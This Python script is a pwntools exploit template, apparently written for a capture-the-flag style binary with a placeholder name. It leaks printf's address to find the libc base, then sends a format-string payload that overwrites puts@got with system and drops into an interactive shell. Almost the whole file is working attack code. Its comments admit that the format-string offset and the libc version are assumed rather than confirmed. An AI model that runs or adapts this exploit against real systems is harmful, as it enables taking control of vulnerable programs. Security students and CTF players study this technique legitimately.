#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '[ERROR_404]')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

# Get the printf address from output
io.recvuntil(b'printf @ ')
printf_leak = int(io.recvline().strip(), 16)
log.info(f"Leaked printf address: {hex(printf_leak)}")

# For this example, we'll assume we have libc (you'd normally need to identify the exact version)
libc = ELF('libc.so.6')  # Adjust path to your libc
libc.address = printf_leak - libc.symbols['printf']
log.info(f"Libc base: {hex(libc.address)}")

# Calculate necessary addresses
puts_got = exe.got['puts']
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

log.info(f"puts@got: {hex(puts_got)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(bin_sh)}")

# Craft the payload
# We need to find the correct offset for the format string vuln
# Let's say we found offset 6 through testing
offset = 6

# Create format string to overwrite puts@got with system
payload = fmtstr_payload(offset, {puts_got: system_addr})

# Send the payload
io.sendline(payload)

io.interactive()

